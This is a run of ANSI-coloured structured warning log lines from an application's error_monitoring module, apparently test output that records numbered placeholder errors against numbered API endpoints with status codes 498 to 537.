WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744320Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1098'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1099'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1100'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1101'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1102'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744831Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1103'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744880Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1104'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744928Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1105'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1106'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1107'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745074Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1108'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1109'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745170Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1110'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745217Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1111'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745266Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1112'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745314Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1113'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745362Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1114'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745451Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1115'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1116'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1117'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745693Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1118'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745754Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1119'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745809Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1120'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745862Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1121'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745917Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1122'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.745969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1123'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1124'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1125'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746113Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1126'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1127'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746224Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1128'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1129'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746330Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1130'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1131'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746431Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1132'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746482Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1133'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746533Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1134'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1135'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1136'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746681Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1137'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
